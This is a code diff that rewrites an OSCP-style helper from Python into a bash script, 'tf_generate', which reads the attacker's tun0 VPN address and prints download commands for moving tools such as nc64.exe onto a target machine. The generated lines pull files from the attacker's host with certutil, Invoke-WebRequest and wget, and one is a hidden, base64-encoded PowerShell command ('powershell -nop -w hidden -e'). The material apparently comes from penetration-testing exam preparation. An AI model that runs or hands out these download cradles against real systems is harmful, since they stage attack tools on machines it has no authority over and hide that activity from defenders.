@@ -1,36 +1,47 @@
-#!/usr/bin/env python3
+#!/bin/bash
+# Inspired by Miharada (Tiwa Ramdhani) [https://github.com/Miharada/MyOSCPTools/blob/main/TransferFileGenerator.py]
 
-# Created: Miharada (Tiwa Ramdhani) -> https://github.com/Miharada/MyOSCPTools/blob/main/TransferFileGenerator.py
-# slight modifications to suit my needs
+function get_tun0_ip {
+    ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1
+}
 
-import sys
-import base64
+# Check if tun0 exists
+if ! ip link show tun0 &>/dev/null; then
+    echo "Error: tun0 interface not found. Please ensure it is active."
+    exit 1
+fi
 
-if len(sys.argv) != 5:
-    print("Usage: tf_generate <command> <file> <outputPath> <LHOST_PORT>")
-    print(r'Ex: tf_generate certutil winPEASx64.exe "C:\Users\Public\winpeas.exe" "192.168.45.1:8000"')
-    print("\nAvailable commands:")
-    print("  certutil   - Windows certutil to download a file")
-    print("  iwr        - Invoke-WebRequest to download a file via PowerShell")
-    print("  wget       - wget to download a file on Linux")
-    sys.exit(1)
+if [ "$#" -lt 2 ] || [ "$#" -gt 3 ]; then
+    echo "Usage: tf_generate <file_name> <file_output> <port>"
+    echo "Ex: tf_generate nc64.exe nc.exe 8080"
+    echo "Port is optional. Default is 80."
+    exit 1
+fi
 
-command = sys.argv[1]
-myfile = sys.argv[2]
-outpath = sys.argv[3]
-lhost_port = sys.argv[4]
+file_name=$1
+file_output=$2
+port=${3:-80}
 
-if command == "certutil":
-    print(f"certutil -urlcache -split -f http://{lhost_port}/{myfile} {outpath}")
+lhost=$(get_tun0_ip)
+if [ -z "$lhost" ]; then
+    echo "Error: Unable to get tun0 IP"
+    exit 1
+fi
 
-elif command == "iwr":
-    payload = f"iwr -Uri http://{lhost_port}/{myfile} -Outfile {outpath}"
-    print(f"iwr -Uri http://{lhost_port}/{myfile} -Outfile {outpath}")
-    print(f"powershell -c \"iwr -Uri http://{lhost_port}/{myfile} -Outfile {outpath}\"")
-    print(f"powershell -nop -w hidden -e {base64.b64encode(payload.encode('utf16')[2:]).decode()}")
+# Generate payloads
+certutil_payload="certutil -urlcache -split -f http://$lhost:$port/$file_name $file_output"
+iwr_payload="iwr -Uri http://$lhost:$port/$file_name -Outfile $file_output"
+iwr_encoded=$(echo -n "$iwr_payload" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
+wget_payload="wget http://$lhost:$port/$file_name -O $file_output"
 
-elif command == "wget":
-    payload = f"wget http://{lhost_port}/{myfile} -O {outpath}"
-    print(f"wget http://{lhost_port}/{myfile} -O {outpath}")
-    print(f"powershell -c \"wget http://{lhost_port}/{myfile} -O {outpath}\"")
-    print(f"powershell -nop -w hidden -e {base64.b64encode(payload.encode('utf16')[2:]).decode()}")
+# Print outputs
+echo "== Windows =="
+echo "$certutil_payload"
+echo
+echo "$iwr_payload"
+echo
+echo "powershell -nop -w hidden -e $iwr_encoded"
+echo
+
+echo "== Linux =="
+echo "$wget_payload"
